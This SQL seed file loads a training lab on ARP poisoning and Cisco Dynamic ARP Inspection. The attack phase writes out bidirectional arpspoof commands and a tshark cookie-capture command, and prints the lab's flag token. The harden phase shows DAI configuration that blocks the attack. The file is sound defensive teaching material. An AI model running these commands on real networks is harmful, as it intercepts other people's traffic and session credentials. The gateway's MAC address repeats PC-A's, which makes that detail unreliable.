-- ═══════════════════════════════════════════════════════
-- Lab 38 (id=38) — Dynamic ARP Inspection : full content (Vol 2 · Ch 14)
-- ═══════════════════════════════════════════════════════

UPDATE labs
SET short_desc = 'Poison two ARP caches at once to sit invisibly between a host and its gateway — then watch DAI drop every forged reply using nothing but the binding table the last lab built.',
    topic = 'security',
    difficulty = 'hard',
    book_ref = 'Vol 2 · Ch 14'
WHERE id = 38;

-- ─────────────────────────── BUILD ───────────────────────────
UPDATE lab_phases SET
  title = 'Snooping on, ARP honest',
  is_pro_only = false,
  content = $md$
<div class="phase-head"><span class="phase-tag">Build</span><h3>Snooping on, ARP honest</h3></div>
    <p class="goal">Carry Lab 37's state forward: snooping enabled, PC-A holding a DHCP lease so the binding table has a real entry for it. Confirm the honest ARP path before poisoning it.</p>
    <div class="step">
      <div class="step-label"><span class="n">1</span> Confirm the binding exists (DAI's source of truth)</div>
      <pre><button class="copy-btn">copy</button><span class="prompt">SW1#</span> show ip dhcp snooping binding
<span class="cmt">MacAddress        IpAddress    Lease  Type          VLAN  Interface
aabb.cc00.0100    10.0.10.10   6210   dhcp-snooping   10   Et0/1     ← PC-A</span></pre>
      <div class="note why"><strong>No binding, no defense:</strong> DAI only knows PC-A is legitimately <code>10.0.10.10</code> on <code>e0/1</code> because snooping watched it lease that address. A statically-addressed host has no binding — remember that for the harden phase.</div>
    </div>
    <div class="step">
      <div class="step-label"><span class="n">2</span> Baseline PC-A's ARP for the gateway</div>
      <pre><button class="copy-btn">copy</button><span class="prompt">PC-A></span> show arp
<span class="cmt">10.0.10.1   aabb.cc00.0100(R1)   ← real gateway MAC. This is what gets poisoned.</span></pre>
    </div>
  </div>

  <!-- ATTACK -->
$md$
WHERE lab_id = 38 AND phase = 'build';

-- ─────────────────────────── ATTACK ───────────────────────────
UPDATE lab_phases SET
  title = 'Poison the cache, sit in the middle',
  is_pro_only = false,
  content = $md$
<div class="phase-head"><span class="phase-tag">Attack</span><h3>Poison the cache, sit in the middle</h3></div>
    <p class="goal">Tell PC-A that the gateway lives at Kali's MAC, and tell the gateway that PC-A lives at Kali's MAC. Both directions now flow through you.</p>
    <div class="step">
      <div class="step-label"><span class="n">1</span> Bidirectional ARP poisoning</div>
      <pre><button class="copy-btn">copy</button><span class="prompt">kali$</span> sysctl -w net.ipv4.ip_forward=1
<span class="attackline">kali$ arpspoof -i eth0 -t 10.0.10.10 10.0.10.1 &amp;</span>   <span class="cmt"># tell PC-A: I'm the gateway</span>
<span class="attackline">kali$ arpspoof -i eth0 -t 10.0.10.1 10.0.10.10 &amp;</span>   <span class="cmt"># tell R1: I'm PC-A</span></pre>
      <div class="note watch"><strong>Confirm the poisoning landed:</strong> PC-A's ARP entry for the gateway now points at Kali's MAC — traffic it sends "to the gateway" is handed to you first.</div>
      <pre><button class="copy-btn">copy</button><span class="prompt">PC-A></span> show arp
<span class="cmt">10.0.10.1   <b>00:0c:29:xx:xx:66</b>(Kali)   ← poisoned</span></pre>
    </div>
    <div class="step">
      <div class="step-label"><span class="n">2</span> Capture the flag from the middle</div>
      <pre><button class="copy-btn">copy</button><span class="prompt">kali$</span> tshark -i eth0 -Y 'http.cookie' -T fields -e http.cookie
<span class="cmt">SESSION=NB38-4rp-p0is0n-7b2e</span></pre>
    </div>
    <div class="flag">
      <div class="flag-label">🚩 Flag</div>
      <h4>Capture a token from traffic PC-A believed it was sending to the gateway.</h4>
      <div class="flag-row"><input id="flag-in" placeholder="NB38-..."><button onclick="checkFlag()">Submit</button></div>
      <div class="flag-msg" id="flag-msg"></div>
    </div>
    <details class="hint"><summary>Hint 1 — poisoning works but I capture nothing</summary>
      <p>You poisoned only one direction. A full MITM needs both: PC-A must think you're the gateway <em>and</em> the gateway must think you're PC-A, or return traffic bypasses you. Run both <code>arpspoof</code> directions, and confirm <code>ip_forward=1</code> so you relay rather than black-hole (a black hole breaks the victim's connectivity and gets noticed).</p></details>
    <details class="hint"><summary>Hint 2 — entries keep reverting to the real MAC</summary>
      <p>Legitimate ARP replies from R1 are racing yours. <code>arpspoof</code> re-sends continuously to win by recency — make sure it's still running (the <code>&amp;</code> backgrounded it) and hasn't errored out. Some hosts also age entries slowly; keep the stream going.</p></details>
  </div>

  <!-- HARDEN -->
$md$
WHERE lab_id = 38 AND phase = 'attack';

-- ─────────────────────────── HARDEN ───────────────────────────
UPDATE lab_phases SET
  title = 'Validate every ARP against the record',
  is_pro_only = false,
  content = $md$
<div class="phase-head"><span class="phase-tag">Harden</span><h3>Validate every ARP against the record</h3></div>
    <p class="goal">DAI intercepts ARP on untrusted ports and checks sender IP/MAC against the snooping binding table. Kali claiming to be <code>10.0.10.1</code> from a port bound to a different address is a mismatch — dropped before PC-A ever hears it.</p>
    <div class="step">
      <div class="step-label"><span class="n">1</span> Enable DAI, trust the same uplink</div>
      <pre><button class="copy-btn">copy</button><span class="prompt">SW1(config)#</span> ip arp inspection vlan 10
<span class="prompt">SW1(config)#</span> interface e0/0
<span class="prompt">SW1(config-if)#</span> ip arp inspection trust        <span class="cmt"># same trust boundary as snooping</span>
<span class="prompt">SW1(config)#</span> ip arp inspection validate src-mac dst-mac ip   <span class="cmt"># stricter checks</span></pre>
      <div class="note why"><strong>Why it can't be raced:</strong> DAI doesn't count or rate — on an untrusted port it <em>validates and drops</em>. Kali's forged ARP claims <code>10.0.10.1</code>, but the binding table says <code>10.0.10.1</code> isn't on e0/3. Mismatch → dropped. Recency can't win a race that never reaches the wire.</div>
    </div>
    <div class="step">
      <div class="step-label"><span class="n">2</span> Re-attack — the forged ARP is dropped</div>
      <pre><button class="copy-btn">copy</button><span class="attackline">kali$ arpspoof -i eth0 -t 10.0.10.10 10.0.10.1</span>

<span class="prompt">SW1#</span> <span class="cmt">%SW_DAI-4-DHCP_SNOOPING_DENY: 1 Invalid ARPs (Req) on Et0/3, vlan 10.
  ([00:0c:29:xx:xx:66/10.0.10.1/...])  ← forged binding, denied</span>

<span class="prompt">PC-A></span> show arp
<span class="good">10.0.10.1   aabb.cc00.0100(R1)   ← still the real gateway. Poison never landed.</span></pre>
      <div class="note trap"><strong>Bench trap — static hosts:</strong> DAI drops ARP from any host without a snooping binding. A server with a <em>static</em> IP has no binding, so its legitimate ARP gets denied too. For those, add an <code>arp access-list</code> and <code>ip arp inspection filter</code> — otherwise you'll "harden" your own servers off the network. This is the #1 DAI outage in production.</div>
    </div>
    <div class="step">
      <div class="step-label"><span class="n">3</span> Note the rate-limit safety net</div>
      <p>DAI also rate-limits ARP on untrusted ports (default 15 pps). An <code>arpspoof</code> flood can trip it and err-disable the port — a second layer that stops the attack even as a DoS attempt:</p>
      <pre><button class="copy-btn">copy</button><span class="prompt">SW1#</span> show ip arp inspection interfaces
<span class="cmt">Interface   Trust State   Rate (pps)   Burst Interval
Et0/3       Untrusted     15           1              ← flood trips this</span></pre>
    </div>
  </div>
$md$
WHERE lab_id = 38 AND phase = 'harden';

-- ─────────────────────────── TOPOLOGY ───────────────────────────
INSERT INTO lab_topologies (lab_id, svg_small, svg_large, legend)
VALUES (
  38,
  $svg$<svg viewBox="0 0 720 320" role="img" aria-label="Router gateway, switch with DHCP snooping, a client, and a Kali attacker poisoning ARP to sit between them">
      <rect x="40" y="30" width="150" height="50" rx="8" fill="#eff6ff" stroke="#2563eb" stroke-width="2"/>
      <text x="115" y="52" text-anchor="middle" font-family="monospace" font-size="14" font-weight="700" fill="#2563eb">R1</text>
      <text x="115" y="68" text-anchor="middle" font-family="monospace" font-size="9.5" fill="#64748b">gateway · 10.0.10.1</text>
      <rect x="300" y="30" width="130" height="50" rx="8" fill="#eff6ff" stroke="#2563eb" stroke-width="2"/>
      <text x="365" y="52" text-anchor="middle" font-family="monospace" font-size="14" font-weight="700" fill="#2563eb">SW1</text>
      <text x="365" y="68" text-anchor="middle" font-family="monospace" font-size="9.5" fill="#64748b">snooping + DAI</text>
      <line x1="190" y1="55" x2="300" y2="55" stroke="#16a34a" stroke-width="3"/>
      <text x="245" y="46" text-anchor="middle" font-family="monospace" font-size="9" fill="#16a34a" font-weight="700">e0/0 · trusted</text>
      <line x1="330" y1="80" x2="200" y2="230" stroke="#64748b" stroke-width="2"/>
      <line x1="400" y1="80" x2="560" y2="230" stroke="#e5484d" stroke-width="2" stroke-dasharray="6 4"/>
      <text x="250" y="160" font-family="monospace" font-size="9" fill="#64748b">e0/1 · untrusted</text>
      <text x="460" y="160" font-family="monospace" font-size="9" fill="#e5484d">e0/3 · untrusted</text>
      <rect x="130" y="230" width="130" height="56" rx="8" fill="#fff" stroke="#2563eb" stroke-width="1.5"/>
      <text x="195" y="252" text-anchor="middle" font-family="monospace" font-size="13" font-weight="700" fill="#0f172a">PC-A</text>
      <text x="195" y="268" text-anchor="middle" font-family="monospace" font-size="9.5" fill="#64748b">10.0.10.10 (DHCP)</text>
      <rect x="500" y="230" width="130" height="56" rx="8" fill="#fef2f2" stroke="#e5484d" stroke-width="1.5"/>
      <text x="565" y="252" text-anchor="middle" font-family="monospace" font-size="13" font-weight="700" fill="#e5484d">KALI</text>
      <text x="565" y="268" text-anchor="middle" font-family="monospace" font-size="9.5" fill="#e5484d">claims to be .1</text>
      <text x="360" y="308" text-anchor="middle" font-family="monospace" font-size="10" fill="#94a3b8">Kali tells PC-A "I am 10.0.10.1" — DAI checks that claim against the binding table</text>
    </svg>$svg$,
  $svg$<svg viewBox="0 0 720 320" role="img" aria-label="Router gateway, switch with DHCP snooping, a client, and a Kali attacker poisoning ARP to sit between them">
      <rect x="40" y="30" width="150" height="50" rx="8" fill="#eff6ff" stroke="#2563eb" stroke-width="2"/>
      <text x="115" y="52" text-anchor="middle" font-family="monospace" font-size="14" font-weight="700" fill="#2563eb">R1</text>
      <text x="115" y="68" text-anchor="middle" font-family="monospace" font-size="9.5" fill="#64748b">gateway · 10.0.10.1</text>
      <rect x="300" y="30" width="130" height="50" rx="8" fill="#eff6ff" stroke="#2563eb" stroke-width="2"/>
      <text x="365" y="52" text-anchor="middle" font-family="monospace" font-size="14" font-weight="700" fill="#2563eb">SW1</text>
      <text x="365" y="68" text-anchor="middle" font-family="monospace" font-size="9.5" fill="#64748b">snooping + DAI</text>
      <line x1="190" y1="55" x2="300" y2="55" stroke="#16a34a" stroke-width="3"/>
      <text x="245" y="46" text-anchor="middle" font-family="monospace" font-size="9" fill="#16a34a" font-weight="700">e0/0 · trusted</text>
      <line x1="330" y1="80" x2="200" y2="230" stroke="#64748b" stroke-width="2"/>
      <line x1="400" y1="80" x2="560" y2="230" stroke="#e5484d" stroke-width="2" stroke-dasharray="6 4"/>
      <text x="250" y="160" font-family="monospace" font-size="9" fill="#64748b">e0/1 · untrusted</text>
      <text x="460" y="160" font-family="monospace" font-size="9" fill="#e5484d">e0/3 · untrusted</text>
      <rect x="130" y="230" width="130" height="56" rx="8" fill="#fff" stroke="#2563eb" stroke-width="1.5"/>
      <text x="195" y="252" text-anchor="middle" font-family="monospace" font-size="13" font-weight="700" fill="#0f172a">PC-A</text>
      <text x="195" y="268" text-anchor="middle" font-family="monospace" font-size="9.5" fill="#64748b">10.0.10.10 (DHCP)</text>
      <rect x="500" y="230" width="130" height="56" rx="8" fill="#fef2f2" stroke="#e5484d" stroke-width="1.5"/>
      <text x="565" y="252" text-anchor="middle" font-family="monospace" font-size="13" font-weight="700" fill="#e5484d">KALI</text>
      <text x="565" y="268" text-anchor="middle" font-family="monospace" font-size="9.5" fill="#e5484d">claims to be .1</text>
      <text x="360" y="308" text-anchor="middle" font-family="monospace" font-size="10" fill="#94a3b8">Kali tells PC-A "I am 10.0.10.1" — DAI checks that claim against the binding table</text>
    </svg>$svg$,
  '[]'::jsonb
)
ON CONFLICT (lab_id) DO UPDATE SET
  svg_small = EXCLUDED.svg_small,
  svg_large = EXCLUDED.svg_large,
  legend    = EXCLUDED.legend;
